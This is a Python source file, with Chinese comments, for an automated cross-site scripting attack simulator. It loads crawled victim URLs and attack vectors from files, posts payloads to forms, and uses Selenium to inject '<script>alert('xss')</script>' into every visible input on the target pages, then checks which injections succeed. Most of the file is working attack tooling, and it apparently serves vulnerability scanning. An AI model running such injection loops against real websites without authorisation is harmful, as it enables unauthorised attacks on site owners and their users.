from selenium import webdriver
from selenium.common import exceptions as selenium_exceptions
import urllib.request
import web_checker.check as check_module
import json
import time
import os
import re

class Simluation_Attacker(object):
    def __init__(self):
        #攻击向量列表#
        self.attacker_vector_list = []
        #受害者网页列表#
        self.victim_weblist = []
        #用于表单攻击，上传表单的key#
        self.form_submit_key = []
        self.load_res()
        pass

    def gen_attacker_url(self,victim_url,attacker_vector,form_submit_key,menthod = 'form_post'):
        if menthod == 'form_get':
            return victim_url + '?' + form_submit_key + '=' + attacker_vector
        if menthod == 'form_post':
            body_data = '{\''+form_submit_key+'\':\''+ attacker_vector + '\'}'
            # body_data = urllib.urlencode('{\''+form_submit_key+'\':\''+ attacker_vector + '\'}')
            return victim_url,body_data

    #获取成员变量的各种资源#
    def load_res(self):
        with open('crawler_scrapy/url_list.txt', 'r', encoding='utf-8') as f:
            while 1:
                url = f.readline()
                if not url:
                    break
                self.victim_weblist.append(url.split('\n')[0])
        with open('crawler_scrapy/target_list.txt', 'r', encoding='utf-8') as f:
            while 1:
                injured_key = f.readline()
                if not injured_key:
                    break
                self.form_submit_key.append(injured_key.split('\n')[0])
        with open('gen_attacker_vector/attackerlist.txt', 'r', encoding='utf-8') as f:
            while 1:
                vector = f.readline()
                if not vector:
                    break
                self.attacker_vector_list.append(vector.split('\n')[0])
        pass

    def form_attacker(self,menthod = 'form_post'):
        try:
            for victim_url in self.victim_weblist:
                for key in self.form_submit_key:
                    for vector in self.attacker_vector_list:
                        url, data = self.gen_attacker_url(victim_url, vector, key)
                        print (data)
                        # data_urlencode = urllib.parse.urlencode(data).encode(encoding='UTF8')
                        data_urlencode = urllib.parse.urlencode({'test':'<script>alert("xss")</script> '}).encode(encoding='UTF8')
                        req = urllib.request.Request(url, data=data_urlencode)
                        reponse = urllib.request.urlopen(req).read()
        except Exception as e:
            print(e)
        pass

class Simluation_Request(object):
    def __init__(self):
        self.form_list = []
        self.inv_input_list = []

    def load_inv_input_list(self):
        inv_input_list = []
        #with open('%s/crawler_scanner/'injured_form_list.json' % os.path.dirname(__file__) , 'r') as f:
        with open('%s/crawler_scanner/injured_input_list.json' % os.path.dirname(__file__), 'r') as f:
            while 1:
                json_lines = f.readline()
                if not json_lines:
                    break
                inv_input_list.append(json.loads(json_lines))
            self.inv_input_list = inv_input_list
        return inv_input_list

    def get_source_url_list(self,all_input_list,all_form_list):
        result_urllist = []
        current_url = ''
        if (all_input_list != None):
            for list_item in all_input_list:
                if (current_url != list_item['source_url']):
                    current_url = list_item['source_url']
                    result_urllist.append(list_item['source_url'])
        if (all_form_list != None):
            for list_item in all_form_list:
                if (current_url != list_item['source_url']):
                    current_url = list_item['source_url']
                    result_urllist.append(list_item['source_url'])
        return result_urllist

    # 获取相同source_url列表的元素
    def get_same_targeturl_input(self,url,all_input_list,all_form_list):
        same_url_inputs = []
        same_url_forms = []
        if (all_input_list != None):
            for list_item in all_input_list:
                if (list_item['source_url'] == url):
                    same_url_inputs.append(list_item)
        if (all_form_list != None):
            for list_item in all_form_list:
                if (list_item['source_url'] == url):
                    same_url_forms.append(list_item)
        return same_url_inputs,same_url_forms

    def find_inputable_input_box(self,list_waitforinput):
        clean_list_waitforinput = []
        for item in list_waitforinput:
            if (item['type']!=None):
                if(re.match('hidden|image|readonly|disabled|submit',item['type'])):
                    continue
                else:
                    clean_list_waitforinput.append(item)
            else:
                clean_list_waitforinput.append(item)
        return clean_list_waitforinput

    def find_clickedable_buttons(self,list_waitforclick):
        clean_list_waitforclick = []
        for item in list_waitforclick:
            if (item['type'] != None):
                if (re.match('submit', item['type'])):
                    clean_list_waitforclick.append(item)
        return clean_list_waitforclick

    def check_inv_input_list_nonhidden(self, vector, list_waitforinput, list_waitforclick):
        flag = 'exit_success'
        list_successinjuredinput = []
        target_url = list_waitforinput[0]['source_url']
        browser_options = webdriver.ChromeOptions()
        for point_waitforinput in list_waitforinput:
            if_successful = False
            run_check,stored_success_check = check_module.check_attacksuccess_byfindalter(target_url, background=False)
            if (run_check != 'run_success'):
                flag = 'fail:url_unreachable'
                break;
            else:
                # 如果在本注入点注入之前就会检测到注入成功的话，一定是因为最后一个注入点漏洞是存储型XSS漏洞，直接退出
                if (stored_success_check == 'injured_success'):
                    flag = 'success:last_stored_xss'
                    break;

            for point_waitforclick in list_waitforclick:
                # browser_options.add_argument('headless')
                driver = webdriver.Chrome(r'%s/drivers/chromedriver.exe' % os.path.dirname(__file__),
                                          chrome_options=browser_options)
                driver.get(point_waitforinput['source_url'])
                current_rul = point_waitforinput['source_url']
                try:
                    #拥有id的情况
                    if(point_waitforinput['id'] != None):
                        input_box =  driver.find_element_by_id(point_waitforinput['id'])
                        input_box.clear()
                        input_box.send_keys(vector)
                    #拥有name的情况
                    if(point_waitforinput['name']!=None):
                        input_box =  driver.find_element_by_name(point_waitforinput['name'])
                        input_box.clear()
                        input_box.send_keys(vector)
                    #进行点击
                    if(point_waitforclick['id'] != None):
                        driver.find_element_by_id(point_waitforclick['id']).click()
                    if(point_waitforclick['name'] != None):
                        driver.find_element_by_name(point_waitforclick['name']).click()
                except selenium_exceptions.InvalidElementStateException:
                    continue
                #点击后检测是否成功
                if_successful = check_module.check_if_drivers_exist(driver)
            if (if_successful): list_successinjuredinput.append(point_waitforinput)

        return list_successinjuredinput,flag




if __name__ == '__main__':
    # attacker = Simluation_Attacker()
    # attacker.form_attacker()
    srequester = Simluation_Request()
    inv_list = srequester.load_inv_input_list()
    target_url_list = srequester.get_source_url_list(inv_list,None)
    for url in target_url_list:
        target_list_inv_input,target_list_form_input = srequester.get_same_targeturl_input(url,inv_list,None)
        list_successinjuredinput, flag = srequester.check_inv_input_list_nonhidden('<script>alert(\\\'xss\\\')</script>', srequester.find_inputable_input_box(target_list_inv_input),srequester.find_clickedable_buttons(target_list_inv_input))
        print(list_successinjuredinput)
